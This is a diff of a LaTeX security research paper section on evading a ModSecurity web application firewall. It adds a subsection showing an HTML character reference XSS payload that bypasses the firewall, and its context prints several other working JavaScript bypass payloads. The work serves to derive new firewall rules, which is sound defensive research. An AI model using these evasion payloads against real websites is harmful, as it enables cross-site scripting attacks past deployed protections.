@@ -1,6 +1,6 @@
 \subsection{Multi Iteration Evaluation}
 \label{sec:multiiteration}
-This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}. 
+This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be detailed and used to derive additional firewall rules as shown under Section~\ref{sec:rulesproposal}.
 
 
 \subsubsection{Percent encoding + Unicode in JSON}
@@ -19,6 +19,7 @@ The ModSecurity firewall detected the unicode escape regardless and rejects the 
 
 
 \subsubsection{Double Percent encoding}
+\label{sec:doublepercenc}
 The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
 On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:
 
@@ -36,6 +37,30 @@ However, this payload would not be valid unless the target also performs multipl
 	data octet as the beginning of a percent-encoding, or vice versa in
 	the case of percent-encoding an already percent-encoded string.
 \end{quote}
+
+\subsubsection{Double HTML character reference}
+\label{sec:doublehtmlcharref}
+As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules caused the ModSecurity firewall using CRS4.1 to block the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+<a href=javascript:alert('a')>ClickMeFor$</a>
+\end{lstlisting}
+
+After obscuring the payload with a single iteration of HTML character reference substitution, the modified payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+<a href=jav&#x61;script:alert('a')>ClickMeFor$</a>
+\end{lstlisting}
+
+successfully bypassed two of the three blocking rules.
+
+On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload becomes:
+
+\begin{lstlisting}[style=basicStyle, language=Python, caption=HTML character reference bypass, label={lst:htmlcharacterreferencebypass}]
+<a href=jav&#x61;script:alert&#x28;'a')>ClickMeFor$</a>
+\end{lstlisting}
+
+and successfully bypasses the firewall.
 
 
 \subsubsection{HTML encoding + JavaScript normal character escape}
@@ -103,7 +128,7 @@ To evade rule with id \verb|934100|, calling the \verb|Function()| constructor w
 []['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
 \end{lstlisting}
 
-Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:
 
 \begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
 [].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
@@ -129,7 +154,7 @@ Evading rule \verb|932130| was possible by using a form of unicode escaping in J
 []['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
 \end{lstlisting}
 
-Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:
 
 \begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
 [].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
@@ -171,7 +196,7 @@ On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a 
 
 successfully evaded the firewall.
 
-Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 
+Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall:
 
 \begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
 [].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
